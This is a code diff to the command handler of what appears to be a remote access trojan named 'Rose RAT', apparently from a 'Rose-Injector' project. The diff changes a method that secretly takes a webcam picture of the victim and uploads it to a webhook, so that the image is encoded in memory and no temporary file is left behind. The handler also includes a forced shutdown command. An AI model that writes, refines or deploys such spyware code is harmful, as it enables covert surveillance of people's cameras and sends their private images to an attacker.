@@ -12,6 +12,7 @@ import string
 import ctypes
 import os
 import subprocess
+import io
 
 from configuration import Config 
 cc = Config()
@@ -78,16 +79,15 @@ class CommandHandler():
         os.system("shutdown /s /t 1")
         
     def webcampic(self): #Take a picture with the webcam and send it with the webhook
-        try:
-            file_name = ''.join(random.choice(string.ascii_letters) for i in range(10))
+        try:            
             cam = cv2.VideoCapture(0)   # 0 -> index of camera
             s, img = cam.read()
             if s:    # frame captured without any errors
-                cv2.imwrite(f"temp_{file_name}.jpg",img)
-
-            file = File(f"temp_{file_name}.jpg", name='Rose-Injector WebcamPIC.jpg') 
-            self.webhook.send(file=file)
-            os.remove(f"temp_{file_name}.jpg")
+                suc, buffer = cv2.imencode(".jpg", img)
+                io_buf = io.BytesIO(buffer)
+                file = File(io_buf,name='cam.jpg') 
+                self.webhook.send(file=file)
+                
         except Exception as e:
             embed = Embed(
             description='Rose RAT',
